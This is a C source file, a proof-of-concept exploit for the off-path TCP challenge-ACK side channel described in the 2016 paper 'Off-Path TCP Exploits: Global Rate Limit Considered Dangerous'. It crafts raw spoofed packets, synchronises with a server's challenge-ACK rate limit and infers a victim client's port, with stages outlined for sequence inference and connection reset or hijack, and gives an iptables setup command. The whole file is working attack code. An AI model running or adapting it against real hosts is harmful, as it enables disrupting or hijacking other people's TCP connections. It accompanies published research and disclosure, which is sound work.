/*
 * Proof-of-concept code for:
 * "Off-Path TCP Exploits: Global Rate Limit Considered Dangerous"
 * http://www.cs.ucr.edu/~zhiyunq/pub/sec16_TCP_pure_offpath.pdf
 *
 * by Joshua J. Drake (jdrake@zimperium.com) on 2016-08-18
 *
 * NOTE: You need to use iptables to DROP packets from the target host/port
 *
 * # iptables -A INPUT -j DROP -p tcp -s [server addr] --sport [server port]
 *
 * Otherwise, your legitimate TCP stack will interfere with this program's
 * operation.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* internet networking */
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

/* packet capturing */
#include <pcap/pcap.h>

/* raw packet crafting */
#define __FAVOR_BSD 1
#include <netinet/ip.h>
#include <netinet/tcp.h>

/* terminal interactions */
#include <termios.h>

/* precise timing */
#include <sys/time.h>

/* threading */
#include <pthread.h>

#include "router.h"


/* attack state tracking */
typedef enum {
	AS_SYNC = 0,
	AS_TUPLE_INFERENCE,
	AS_SEQ_INFERENCE,
	AS_ACK_INFERENCE,
	AS_INJECTION,
	AS_SUCCESS
} astate_t;

/* TCP connection tracking */
typedef enum {
	CS_NEW = 0,
	CS_SYN_SENT,
	CS_CONNECTED,
	CS_FINISHED
} cstate_t;

const char *g_conn_states[] = {
	"NEW",
	"SYN",
	"EST",
	"FIN"
};

typedef struct packet_struct {
	u_char *buf;
	size_t len;
} packet_t;

typedef struct conn_struct {
	cstate_t state;
	u_short id;
	struct sockaddr_in *src;
	struct sockaddr_in *dst;
	/* in host endian */
	u_long seq;
	u_long ack;
} conn_t;

typedef struct thctx_struct {
	pcap_t *pch;
	int ipoff;
	conn_t conn_legit;
	conn_t conn_spoof;
	struct sockaddr_in *cli;
	packet_t *pkt;
	int numpkts;
	suseconds_t delay;
} thctx_t;

/* global count for challange ACKs received in one period */
static volatile int g_chack_cnt = 0;
/* global context for threads operating on pkts */
static volatile thctx_t g_ctx;

/*
 * if DEVICE is not defined, we'll try to find a suitable device..
 */
// #define DEVICE "ppp0"
#define SNAPLEN 1500


/* prototypes.. */
int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct sockaddr_in *pcli);

u_short in_cksum(u_short *addr, size_t len);
void tcp_init(volatile conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, u_long seq);
int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags, char *data, size_t len);
int tcp_send(pcap_t *pch, volatile conn_t *pconn, u_char flags, char *data, size_t len);
int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, u_long *pack, u_long *pseq, void **pdata, size_t *plen
#ifdef DEBUG_SEQ
	, cstate_t conn_state
#endif
	);
char *tcp_flags(u_char flags);

void setterm(int mode);
int kbhit(void);

int lookup_host(char *hostname, struct sockaddr_in *addr);
int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, u_short lport, int *off2ip);


/*
 * The main function of this program simply checks prelimary arguments and
 * and launches the attack.
 */
int main(int argc, char *argv[])
{
	int srvport;
	char myhost[512];
	struct sockaddr_in myaddr, srvaddr, cliaddr;

	/* we're not leaving main until we're sure the arguments are good. */
	if (argc < 4) {
		fprintf(stderr, "usage: %s <server addr> <server port> <client addr> [<client port>]\n", argv[0]);
		return 1;
	}

	/* see if we can get the target server address */
	memset(&srvaddr, 0, sizeof(srvaddr));
	if (!lookup_host(argv[1], &srvaddr))
		return 1;

	/* see if we can get the client's address */
	memset(&cliaddr, 0, sizeof(cliaddr));
	if (!lookup_host(argv[3], &cliaddr))
		return 1;
	if (argc > 4) {
		int cliport = atoi(argv[4]);
		if (cliport < 1 || cliport > 65535) {
			fprintf(stderr, "[!] %s is not a valid port.\n", argv[4]);
			return 1;
		}
		cliaddr.sin_port = htons(cliport);
	}
	else
		cliaddr.sin_port = 0;

	/* make sure the target port is valid */
	srvport = atoi(argv[2]);
	if (srvport < 1 || srvport > 65535) {
		fprintf(stderr, "[!] %s is not a valid port.\n", argv[2]);
		return 1;
	}

	/* it's valid, so I plug it in the the remaddr struct */
	srvaddr.sin_port = htons((u_short)srvport);

	/* lookup ourself */
	memset(&myaddr, 0, sizeof(myaddr));
	if (gethostname(myhost, sizeof(myhost)) == -1) {
		perror("[!] gethostname");
		return 1;
	}
	if (!lookup_host(myhost, &myaddr))
		return 1;

	printf("[*] Launching off-path challenge ACK attack against:\n"
			"    server: %s:%u\n", inet_ntoa(srvaddr.sin_addr),
			ntohs(srvaddr.sin_port));
	printf("    client: %s (port hint: %u)\n", inet_ntoa(cliaddr.sin_addr),
			ntohs(cliaddr.sin_port));
	printf("    from: %s\n", inet_ntoa(myaddr.sin_addr));

	/* here we go.. WOOO */
	return set_up_attack(&myaddr, &srvaddr, &cliaddr);
}


/*
 * attempt to resolve hostname as an ip address using inet_aton(3). if it
 * fails, we must have a DNS name so we try to look it up via gethostbyname(3).
 * if all is good, we fill in addr so that it can be returned via result
 * paramter, and return 1.
 *
 * if the lookup fails, we return 0. to report errors, we use herror(3)
 */
int lookup_host(char *hostname, struct sockaddr_in *addr)
{
	struct hostent *hent;

	addr->sin_family = AF_INET;
	if (!inet_aton(hostname, &(addr->sin_addr))) {
		hent = gethostbyname(hostname);
		if (hent == (struct hostent *)NULL) {
			char errstr[1024] = { 0 };

			snprintf(errstr, sizeof(errstr) - 1, "[!] Unable to resolve: \"%s\"", hostname);
			herror(errstr);
			return 0;
		}
		memcpy(&(addr->sin_addr), hent->h_addr, sizeof(struct in_addr));
	}
	return 1;
}


/*
 * try to start capturing packets from the specified host+port to the local
 * machine on the specified port.
 *
 * on succes, we return 1, on failure, 0
 */
int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, u_short lport, int *off2ip)
{
   struct bpf_program bpfp; /* needed to set the filter */
   char errorstr[PCAP_ERRBUF_SIZE], filterstr[80], *iface;
   int filter = 1;

#ifdef DEVICE
   iface = (char *)malloc(16);
   strncpy(iface, DEVICE, sizeof(iface));
#else
   iface = pcap_lookupdev(errorstr);
   if (iface == NULL) {
	   fprintf(stderr, "[!] Unable to find a suitable capture device: %s\n", errorstr);
	   return 0;
   }
#endif
   printf("[*] Starting capture on \"%s\" ...\n", iface);

   *pcap = pcap_open_live(iface, SNAPLEN, 8, 25, errorstr);
#ifdef DEVICE
   free(iface);
#endif
   if (*pcap == (pcap_t *)NULL) {
	   fprintf(stderr, "[!] pcap_open_live() failed: %s\n", errorstr);
	   return 0;
   }

   switch (pcap_datalink(*pcap)) {
	   case DLT_EN10MB:
		   *off2ip = 14;
		   break;

	   case DLT_SLIP:
		   *off2ip = 16;
		   break;

      case DLT_PPP:
		   *off2ip = 4;
		   filter = 0;
		   fprintf(stderr, "[-] PPP doesn't have filtering, problems may occur.\n");
		   break;

	  case DLT_FDDI:
		   fprintf(stderr, "[!] FDDI is not supported!\n");
		   return 1;

	  case DLT_RAW:
		   fprintf(stderr, "[-] Using the RAW datalink.\n");
		   *off2ip = 0;
		   break;

	  default:
		   *off2ip = 4;
		   break;
   }

   if (filter) {
	   sprintf(filterstr, "tcp and src %s and src port %d and dst port %d", inet_ntoa(psrv->sin_addr),
			   ntohs(psrv->sin_port), lport);
	   if (pcap_compile(*pcap, &bpfp, filterstr, 1, 0) == -1)
		   return 0;
	   if (pcap_setfilter(*pcap, &bpfp) == -1)
		   return 0;
   }
   return 1;
}


/*
 * a thread to spam packets =)
 */
void *send_thread(void *arg)
{
	struct timeval start, now, diff;
	int j;

	while (1) {
#if 0
		if (g_ctx.numpkts > 0)
			printf("[*] Sending %d packets...\n", g_ctx.numpkts);
#endif
		while (g_ctx.numpkts > 0) {
			gettimeofday(&start, NULL);

			pcap_sendpacket(g_ctx.pch, (void *)g_ctx.pkt->buf, g_ctx.pkt->len);

			g_ctx.numpkts--;

			do {
				gettimeofday(&now, NULL);
				timersub(&now, &start, &diff);
			} while (diff.tv_usec < g_ctx.delay);
#ifdef DEBUG_SEND_THREAD_TIME
			printf("%d %lu %lu\n", g_ctx.numpkts, diff.tv_sec, diff.tv_usec);
#endif
		}
		usleep(250);
	}
	return NULL;
}

/*
 * a thread to receive packets =)
 */

void *recv_thread(void *arg)
{
	struct pcap_pkthdr *pchdr = NULL;
	const u_char *inbuf = NULL;
	int pcret;
	u_char flags;
	size_t datalen;

	/* listen for challenge ACKs and count them */
	while (1) {
		pcret = pcap_next_ex(g_ctx.pch, &pchdr, &inbuf);
		if (pcret == 1
			&& tcp_recv(pchdr, inbuf, &flags, NULL, NULL, NULL, &datalen
#ifdef DEBUG_SEQ
				, g_ctx.conn->state
#endif
				)
			&& flags == TH_ACK) {
			g_chack_cnt++;
		}
	}

	/* not reached */
	return NULL;
}


/*
 * conduct the attack:
 * 1. synchronize with remote clock
 * 2. infer four-tuple
 * 3. infer sequence number
 * 4. infer ack number
 * 5. reset/hijack
 * 6. profit?
 *
 */
int conduct_offpath_attack(void)
{
	int chack_cnt[4] = { 0 };
	int i, round = 0;
	u_long old_seq;
	packet_t rst_pkt;
	pthread_t sth, rth;
	struct timeval start, now, diff;
	astate_t attack_state = AS_SYNC;
	volatile conn_t *legit, *spoof;
	u_short guess_start = 0, guess_end = 0, guess_mid = 0;

	legit = &(g_ctx.conn_legit);
	spoof = &(g_ctx.conn_spoof);

	/* generate the packet we'll send over and over to elicit challenge ACKs */
	old_seq = legit->seq;
	legit->seq += 5000;
	rst_pkt.len = 8192;
	rst_pkt.buf = malloc(rst_pkt.len);
	memcpy(rst_pkt.buf, ROUTER_MAC LOCAL_MAC "\x08\x00", g_ctx.ipoff);
	if (!tcp_craft(rst_pkt.buf + g_ctx.ipoff, &rst_pkt.len, legit, TH_RST, NULL, 0))
		return 0;
	rst_pkt.len += g_ctx.ipoff;
	legit->seq = old_seq;

	/* spawn the recv thread first
	 * it will live throughout the attack process...
	 */
	if (pthread_create(&rth, NULL, recv_thread, NULL)) {
		fprintf(stderr, "[!] failed to start recv thread!\n");
		return 0;
	}

	/* spawn the send thread */
	if (pthread_create(&sth, NULL, send_thread, NULL)) {
		fprintf(stderr, "[!] failed to start send thread!\n");
		pthread_cancel(rth);
		return 0;
	}

	while (attack_state != AS_SUCCESS) {
		struct timeval round_start;

		gettimeofday(&round_start, NULL);

		g_ctx.delay = 5000;

		if (g_chack_cnt > 0) {
			fprintf(stderr, "[!] WTF? already received challenge ACKs??\n");
			return 0;
		}

		/* stage 1 */
		if (attack_state == AS_SYNC) {
			/*
			 * 1. send 200 in-window RSTs spaced evenly
			 * 2. count the challenge ACKs returned
			 * 3. adjust accordingly
			 * 4. confirm
			 *
			 * the goal is exactly 100 challenge ACKs received...
			 */
			g_ctx.pkt = &rst_pkt;
			g_ctx.numpkts = 200;
			while (g_ctx.numpkts > 0)
				usleep(250);
#ifdef DEBUG_SEND_TIME
			gettimeofday(&now, NULL);
			timersub(&now, &round_start, &diff);
			printf("  send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
#endif

			/* wait for 2 seconds for challenge ACKs... */
			do {
				usleep(250);
				gettimeofday(&now, NULL);
				timersub(&now, &round_start, &diff);
			} while (diff.tv_sec < 2);
#ifdef DEBUG_RECV_TIME
			printf("  recv took %lu %lu\n", diff.tv_sec, diff.tv_usec);
#endif

			/* the delay before next round starts here.. */
			memcpy(&start, &now, sizeof(start));

			chack_cnt[round] = g_chack_cnt;
			g_chack_cnt = 0;
			printf("[*] time-sync: round %d - %d challenge ACKs\n", round + 1, chack_cnt[round]);

			/* did we synch?? */
			if (chack_cnt[round] == 100) {
				if (round == 2) {
					/* verify... */
					round++;
					continue;
				}
				else if (round == 3) {
					/* verified! */
					printf("[*] Time synchronization complete!\n");
					attack_state = AS_TUPLE_INFERENCE;
					continue;
				}

				/* we got luck! verify... */
				round = 2;
				continue;
			}

			else if (chack_cnt[round] < 100) {
				fprintf(stderr, "[!] invalid number of challenge ACKs! WTF?\n");
				return 0;
			}

			/* woot! */
			else if (round < 2) {
				/* round 1 -> round 2 : delay by 5ms */
				uint64_t delay = 5000;

				if (round == 1) {
					/* round 2 -> round 3 : delay precisely */
					if (chack_cnt[round] >= chack_cnt[0]) {
						delay = (300 - chack_cnt[round]) * 5000;
					} else {
						delay = (chack_cnt[round] - 100) * 5000;
					}
				}

				/* do the delay! */
#ifdef DEBUG_DELAY
				printf("    delaying for %lu us\n", delay);
#endif
				do {
					usleep(250);
					gettimeofday(&now, NULL);
					timersub(&now, &start, &diff);
#ifdef DEBUG_DELAY
					printf("    delay progress %lu %lu\n", diff.tv_sec, diff.tv_usec);
#endif
				} while ((uint64_t)diff.tv_usec < delay);
#ifdef DEBUG_DELAY
				printf("    delay finished %lu %lu\n", diff.tv_sec, diff.tv_usec);
#endif
				round++;
			} else {
				/* start over :-/ */
				fprintf(stderr, "[!] reached round %d without success, restarting...\n", round + 1);
				round = 0;
			}

		/* stage 2 */
		} else if (attack_state == AS_TUPLE_INFERENCE) {
			/*
			 * send a SYN|ACK to try to illicit a challenge ACK for the
			 * purported connection from our victim.
			 */

			/* if we need to initialize the ranges, do so now */
			if (guess_mid == 0) {
				/* if we already have a guess, try it first */
				if (spoof->src->sin_port) {
					/* if it hits, we set these equal to signify a win.
					 *
					 * we leave guess_mid set to 0 in case we missed..
					 */
					guess_start = guess_end = ntohs(spoof->src->sin_port);
				}
				/* no initial guess available... */
				else {
					/* initialize algorithm for port number checking
					 * ... "the default range on Linux is only from 32768 to 61000"
					 */
					// XXX: TODO: scale number of guesses per round based on feedback
					guess_start = 32768;
					guess_end = 65535;
				}
			}

			/* send the packet(s)! */
			if (spoof->src->sin_port) {
				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
					return 0;
				/* only send this once. */
				spoof->src->sin_port = 0;
			} else {
				u_short guess;

				guess_mid = ((uint32_t)guess_start + (uint32_t)guess_end) / 2;
				for (guess = guess_mid; guess < guess_end; guess++) {
					/* meh. we have to recalculate the tcp checksum to alter the source port */
					spoof->src->sin_port = htons(guess);
					if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
						return 0;
				}
				spoof->src->sin_port = 0;
#ifdef DEBUG_SPOOF_SEND
				gettimeofday(&now, NULL);
				timersub(&now, &round_start, &diff);
				printf("  spoof send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
#endif
			}

			/* send 100 RSTs */
			g_ctx.numpkts = 100;
			while (g_ctx.numpkts > 0)
				usleep(250);
			gettimeofday(&now, NULL);
			timersub(&now, &round_start, &diff);
#ifdef DEBUG_SEND_TIME
			printf("  entire send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
#endif
			if (diff.tv_sec > 0) {
				fprintf(stderr, "[!] OH NO! sending took too long!\n");
				return 0;
			}

			/* get the number of challenge ACKs after 1 second */
			do {
				usleep(250);
				gettimeofday(&now, NULL);
				timersub(&now, &round_start, &diff);
			} while (diff.tv_sec < 1);
#ifdef DEBUG_RECV_TIME
			printf("  recv took %lu %lu\n", diff.tv_sec, diff.tv_usec);
#endif

			printf("[*] tuple-infer: guessed port is in [%u - %u) (start: %u): %3d challenge ACKs - %s\n",
					guess_mid, guess_end, guess_start,
					g_chack_cnt, g_chack_cnt == 100 ? "NO" : "OK");

			if (g_chack_cnt == 100) {
				/* if we exhausted the range and still didn't find it, start over */
				if (guess_start >= guess_end) {
					/* FAIL! */
					printf("[!] Exhausted port search, starting over...\n");
					guess_start = guess_end = guess_mid = 0;
				}
				else
					/* adjust range */
					guess_end = guess_mid - 1;
			} else if (g_chack_cnt == 99) {
				/* if we only sent one guess this time, we won! */
				if (guess_start == guess_end) {
					/* special handling for hinted guess */
					printf("[*] Guessed client port: %u\n", guess_start);
					spoof->src->sin_port = ntohs(guess_start);
					attack_state = AS_SEQ_INFERENCE;
				} else if (guess_end - guess_mid == 1) {
					/* we legitimately guessed it! */
					printf("[*] Guessed client port: %u\n", guess_mid);
					spoof->src->sin_port = ntohs(guess_mid);
					attack_state = AS_SEQ_INFERENCE;
				}
				else
					/* adjust range */
					guess_start = guess_mid;
			} else {
				// XXX: TODO: scale number of guesses per round based on feedback
				fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
			}

			g_chack_cnt = 0;
		}
	}

	return 1;
}


/*
 * this function sets up the attack.
 *
 * it starts by opening a raw socket and starting to capture packets for the
 * legit connection.
 *
 * next, we execute a three-way handshake to get connected.
 *
 * finally, we loop for packets that we captured and do maintenance on the TCP
 * session as needed.
 *
 * special keys while in the data loop:
 * control-U         erase to beginning of line
 * control-[ (Esc)   closes connection and exits
 * "start\n"         launches the offpath attack (after connected)
 */
int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct sockaddr_in *pcli)
{
	int lport = getpid() + 1000;
	pcap_t *pch = NULL;
	struct pcap_pkthdr *pchdr = NULL;
	const u_char *inbuf = NULL;
	int pcret;
	char outbuf[8192];
	int outlen = 0;
	volatile conn_t *pconn;
	int ipoff;

	printf("[*] Selected local port: %d\n", lport);

	if (!start_pcap(&pch, psrv, lport, &ipoff)) {
		pcap_perror(pch, "[!] Unable to start packet capture");
		return 1;
	}
	g_ctx.ipoff = ipoff;

	/* set the local port */
	ploc->sin_port = htons(lport);

	/* initialize the parts of the spoofed connection we know.. */
	tcp_init(&(g_ctx.conn_spoof), pcli, psrv, 0);

	/* make a legit connection to the server */
	pconn = &(g_ctx.conn_legit);
	tcp_init(pconn, ploc, psrv, getpid() * 3000);
	if (!tcp_send(pch, pconn, TH_SYN, NULL, 0))
		return 1;
	pconn->state = CS_SYN_SENT;

	while (pconn->state != CS_FINISHED) {
		pcret = pcap_next_ex(pch, &pchdr, &inbuf);
		if (pcret == 1) {
			u_char flags;
			u_long rack, rseq;
			void *data;
			size_t datalen;

			if (tcp_recv(pchdr, inbuf, &flags, &rack, &rseq, &data, &datalen
#ifdef DEBUG_SEQ
						, pconn->state
#endif
						)) {
				switch (pconn->state) {

					case CS_SYN_SENT:
						/* see if we got a SYN|ACK */
						if ((flags & TH_SYN) && (flags & TH_ACK)
								&& rack == pconn->seq + 1) {
							/* we need to ACK the seq */
							pconn->seq = rack;
							pconn->ack = rseq + 1;
							if (!tcp_send(pch, pconn, TH_ACK, NULL, 0))
								return 1;
							pconn->state = CS_CONNECTED;

							printf("[*] TCP handshack complete! Entering interactive session...\n");
							setterm(0);
						}
						break;

					case CS_CONNECTED:
						/* see if we got data from remote... */
						if ((flags & TH_PUSH) && (flags & TH_ACK)
								&& rack == pconn->seq) {
							//printf("[*] PSH|ACK received (len %lu)\n", datalen);
						}

						/* they just ack'd what we sent only... */
						else if (flags == TH_ACK && rack == pconn->seq) {
							//printf("[*] ACK received (len %lu)\n", datalen);
						}

						/* perhaps the remote said to shut down... */
						else if (flags & TH_FIN) {
							printf("[*] FIN received\n");
							pconn->ack++;
							if (!tcp_send(pch, pconn, TH_ACK, NULL, 0))
								return 1;
							if (!tcp_send(pch, pconn, TH_FIN, NULL, 0))
								return 1;
							pconn->state++;
						}

						else if (flags & TH_RST) {
							if (rseq == pconn->ack) {
								printf("[*] RST received\n");
								pconn->state++;
							}
							/* otherwise, drop the RST */
						}

						else
							printf("[*] Packet with unexpected flags (0x%x) received...\n", flags);

						if (datalen > 0) {
							write(fileno(stdout), data, datalen);
							pconn->ack += datalen;
							if (!tcp_send(pch, pconn, TH_ACK, NULL, 0))
								return 1;
						}

						break;

					default:
						printf("unknown state??\n");
						break;
				}
			}
		}

		/* packet read failure? */
		if (pcret < 0)
			break;

		/* check for keyboard input */
		while (kbhit() == 1) {
			int i, ch = getchar();

			switch (ch)
			{
				case 0xa: // LF
				case 0xd: // CR
					outbuf[outlen++] = '\n';

					/* start the attack now! */
					if (strncmp(outbuf, "start\n", 6) == 0) {

						/* fill in most of the context */
						g_ctx.pch = pch;
						g_ctx.cli = pcli;

						if (!conduct_offpath_attack())
							return 1;
					} else {
						if (!tcp_send(pch, pconn, TH_PUSH|TH_ACK, outbuf, outlen))
							return 1;
						pconn->seq += outlen;
					}
					outlen = 0;
					break;

				case 0x15: // ^U (NAK)
					for (i = 0; i < outlen; i++)
						write(fileno(stdout), "\b \b", 3);
					outlen = 0;
					break;

				case 0x1b: // ^[ (ESC)
					printf("[*] Connection closed.\n");
					if (!tcp_send(pch, pconn, TH_FIN, NULL, 0))
						return 1;
					pconn->seq++;
					sleep(1);
					if (!tcp_send(pch, pconn, TH_ACK, NULL, 0))
						return 1;
					pconn->state = CS_FINISHED;
					break;

				default:
					outbuf[outlen++] = ch;
					break;
			}
		}
	}

	setterm(1);
	pcap_close(pch);
	return 0;
}


/*
 * initialize a connection structure from the parameters
 */
void tcp_init(volatile conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, u_long seq)
{
	pconn->id = (getpid() + 1337) & 0xffff;
	pconn->state = CS_NEW;
	pconn->src = psrc;
	pconn->dst = pdst;
	pconn->seq = seq;
	pconn->ack = 0;
}


/*
 * ripped from ping.c, it calulates the checksum of len bytes at addr and
 * returns it.
 */
u_short in_cksum(u_short *addr, size_t len)
{
	register int nleft = len;
	register u_short *w = addr;
	register int sum = 0;
	u_short answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return answer;
}
/* end ping ripped */


/*
 * craft a TCP packet based on the given parameters
 *
 * this is based on Matt Barrie's old non-working TCPseqnumpred.c
 * the problem with that program was not this function however..
 */
int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags, char *data, size_t len)
{
	struct ip ip;
	struct tcphdr tcp;
	char tcpbuf[4096], *ptr;
	u_short size;

	/* buffer too small? */
	if (*outlen < sizeof(ip) + sizeof(tcp) + len) {
		fprintf(stderr, "tcp_craft: buffer too small!!\n");
		return 0;
	}

	/* construct the IP header */
	ip.ip_hl = sizeof(ip) / 4;
	ip.ip_v = 4;
	ip.ip_tos = 0;
	ip.ip_len = htons(sizeof(ip) + sizeof(tcp) + len);
	ip.ip_id = htons(pconn->id);
	pconn->id++;
	ip.ip_off = 0;
	ip.ip_ttl = 255;
	ip.ip_p = IPPROTO_TCP;
	ip.ip_sum = 0;
	ip.ip_src.s_addr = pconn->src->sin_addr.s_addr;
	ip.ip_dst.s_addr = pconn->dst->sin_addr.s_addr;

	/* calculate the IP checksum */
	ip.ip_sum = in_cksum((u_short *)&ip, sizeof(ip));

	/* construct the TCP header */
	tcp.th_sport = pconn->src->sin_port;
	tcp.th_dport = pconn->dst->sin_port;
	tcp.th_seq = htonl(pconn->seq);
	tcp.th_ack = htonl(pconn->ack);
	tcp.th_x2 = 0;
	tcp.th_off = 5;
	tcp.th_flags = flags;
	tcp.th_win = htons(10052);
	tcp.th_sum = 0;
	tcp.th_urp = 0;

	/* calculate the TCP checksum */
	ptr = tcpbuf;
	memset(tcpbuf, 0, sizeof(tcpbuf));
	memcpy(ptr, &(ip.ip_src.s_addr), 8);
	ptr += 9;
	*ptr++ = ip.ip_p;
	size = htons(len + sizeof(tcp));
	memcpy(ptr, &size, 2);
	ptr += 2;
	memcpy(ptr, &tcp, sizeof(tcp));
	ptr += sizeof(tcp);
	memcpy(ptr, data, len);
	tcp.th_sum = in_cksum((u_short *)tcpbuf, sizeof(tcp) + 12 + len);

	/* build the final packet */
	ptr = output;
	memcpy(ptr, &ip, sizeof(ip));
	ptr += sizeof(ip);
	memcpy(ptr, &tcp, sizeof(tcp));
	ptr += sizeof(tcp);
	memcpy(ptr, data, len);

	*outlen = (void *)ptr + len - output;

	return 1;
}


/*
 * craft and send a packet using libpcap
 */
int tcp_send(pcap_t *pch, volatile conn_t *pconn, u_char flags, char *data, size_t len)
{
	char packet[8192];
	size_t pktlen = sizeof(packet) - g_ctx.ipoff;

	memcpy(packet, ROUTER_MAC LOCAL_MAC "\x08\x00", g_ctx.ipoff);
	if (!tcp_craft(packet + g_ctx.ipoff, &pktlen, pconn, flags, data, len))
		return 0;
	pktlen += g_ctx.ipoff;

	if (pcap_sendpacket(pch, (void *)packet, pktlen) == -1) {
		fprintf(stderr, "[!] pcap_sendpacket failed!\n");
		return 0;
	}

	/* success!! */
#ifdef DEBUG_SEQ
	printf("[*] %s : %d --> %d : %s : seq %lu, ack %lu (len %lu)\n",
			g_conn_states[pconn->state],
			ntohs(tcp.th_sport), ntohs(tcp.th_dport),
			tcp_flags(tcp.th_flags), pconn->seq, pconn->ack, (u_long)len);
#endif
	return 1;
}


/*
 * process the packet captured by libpcap. if everything goes well, we return
 * the TCP flags, ack, seq, and data (w/len) to the caller.
 */
int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, u_long *pack, u_long *pseq, void **pdata, size_t *plen
#ifdef DEBUG_SEQ
		, cstate_t conn_state
#endif
		)
{
	struct ip *pip;
	struct tcphdr *ptcp;
	void *ptr;
	size_t iplen, tcplen, datalen;

	if (pph->caplen < g_ctx.ipoff + sizeof(struct ip)) {
		fprintf(stderr, "[!] tcp_recv: too short to be an IP packet!\n");
		return 0;
	}
	ptr = (void *)inbuf + g_ctx.ipoff;
	pip = (struct ip *)ptr;
	iplen = pip->ip_hl * 4;
	if (pph->caplen < g_ctx.ipoff + iplen) {
		fprintf(stderr, "[!] tcp_recv: too short to be an IP packet (w/options)!\n");
		return 0;
	}
	ptr += iplen;
	if (pph->caplen < g_ctx.ipoff + iplen + sizeof(struct tcphdr)) {
		fprintf(stderr, "[!] tcp_recv: too short to be a TCP packet!\n");
		return 0;
	}
	ptcp = (struct tcphdr *)ptr;
	tcplen = ptcp->th_off * 4;
	ptr += tcplen;
	if (pph->caplen < g_ctx.ipoff + iplen + tcplen) {
		fprintf(stderr, "[!] tcp_recv: too short to be a TCP packet (w/options)!\n");
		return 0;
	}
	datalen = ntohs(pip->ip_len);
	if (iplen + tcplen > datalen) {
		fprintf(stderr, "[!] tcp_recv: IP.IP_LEN too small!\n");
		return 0;
	}
	datalen -= (iplen + tcplen);

#ifdef DEBUG_SEQ
	//printf("inbuf %p, ptcp %p, ptctp+1 %p, caplen %lu\n", inbuf, ptcp, ptcp+1, (u_long)pph->caplen);
	printf("[*] %s : %d <-- %d : %s : seq %lu, ack %lu (len: %lu)\n",
			g_conn_states[conn_state],
			ntohs(ptcp->th_dport), ntohs(ptcp->th_sport),
			tcp_flags(ptcp->th_flags),
			(u_long)ntohl((u_long)ptcp->th_seq), (u_long)ntohl((u_long)ptcp->th_ack), datalen);
#endif


	/* save the output parameters and return */
	if (flags)
		*flags = ptcp->th_flags;
	if (pack)
		*pack = ntohl((u_long)ptcp->th_ack);
	if (pseq)
		*pseq = ntohl((u_long)ptcp->th_seq);
	if (pdata) {
		if (datalen > 0)
			*pdata = ptr;
		else
			*pdata = NULL;
	}
	if (plen)
		*plen = datalen;

	return 1;
}


/*
 * return a string showing which flags are set in the TCP packet
 *
 * netinet/tcp.h:# define TH_FIN      0x01
 * netinet/tcp.h:# define TH_SYN      0x02
 * netinet/tcp.h:# define TH_RST      0x04
 * netinet/tcp.h:# define TH_PUSH     0x08
 * netinet/tcp.h:# define TH_ACK      0x10
 * netinet/tcp.h:# define TH_URG      0x20
 */
char *tcp_flags(u_char flags)
{
	static char str[16];
	char *ptr = str;

	if (flags & TH_FIN)
		*ptr++ = 'F';
	if (flags & TH_SYN)
		*ptr++ = 'S';
	if (flags & TH_RST)
		*ptr++ = 'R';
	if (flags & TH_PUSH)
		*ptr++ = 'P';
	if (flags & TH_ACK)
		*ptr++ = 'A';
	if (flags & TH_URG)
		*ptr++ = 'U';
	*ptr++ = '\0';
	return str;
}


/*
 * prym wrote this stuff for me a long time ago, i thank him for it..
 * i modded it to make it portable (i hope)
 *
 * this function will set the terminal to ICANON (canonical mode). this
 * disables line buffering processing special characters (such as EOF, EOL,
 * WERASE etc).
 */
void setterm(int mode)
{
	static struct termios tmp, old;
	static int old_set = 0;

	if (mode == 0) {
		tcgetattr(fileno(stdin), &tmp);
		memcpy(&old, &tmp, sizeof(struct termios));
		tmp.c_lflag &= ~ICANON;
		tcsetattr(fileno(stdin), TCSANOW, &tmp);
		old_set = 1;
	} else if (old_set) {
		tcsetattr(fileno(stdin), TCSANOW, &old);
	}
}

/*
 * this function select(2)s stdin and returns 1 if there are characters in the
 * input buffer within the alotted time.
 * otherwise it returns 0 (what select(2) returns)
 */
int kbhit(void)
{
	fd_set rfds;
	struct timeval tv;

	FD_ZERO(&rfds);
	FD_SET(fileno(stdin), &rfds);
	tv.tv_sec = 0;
	tv.tv_usec = 25000;

	return select(fileno(stdin) + 1, &rfds, NULL, NULL, &tv);
}
/* thanks again prym */
